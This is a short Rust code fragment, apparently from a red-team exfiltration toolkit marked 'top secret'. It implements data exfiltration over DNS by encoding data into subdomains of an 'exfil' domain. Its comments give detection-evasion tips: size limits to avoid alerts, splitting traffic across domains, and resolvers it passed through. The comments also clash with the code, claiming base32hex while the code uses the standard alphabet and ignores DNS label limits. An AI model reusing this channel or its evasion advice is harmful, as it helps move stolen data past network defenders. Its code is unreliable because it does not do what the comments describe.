// STRENGT FORTROLIG – TS
// DNS tunneling implementation - T1048.003
//
// Max payload: 200 bytes per query (Cloudflare limit)
// Uses base32hex to avoid DNS label issues
//
// Detection notes:
// - Unusual subdomain lengths trigger some NXDomain monitoring
// - Consider splitting across multiple domains per engagement
//
// Tested against:
// - Cloudflare DNS (1.1.1.1) - PASS
// - Google DNS (8.8.8.8) - PASS with rate limiting
//
// Author: Ingrid (2024-06-15)
// exfil-channels/src/dns_exfil.rs
// MITRE ATT&CK T1048 (Exfiltration Over Alternative Protocol)
// Encoding: base32hex + subdomain labels
// Max safe payload per query: ~200 bytes (avoid fragmentation alerts)

fn exfil_dns(data: &[u8]) -> String {
    let encoded = base32::encode(base32::Alphabet::RFC4648 { padding: false }, data);
    format!("{}.exfil.NSM-no.internal", encoded.to_lowercase())
}



// TODO: Base32 encoding hits DNS length limits too fast.
// Vidar suggested switching to Base122 for better packing.
// Investigate for next sprint. - @vidar.nilsen, 2026-02-14
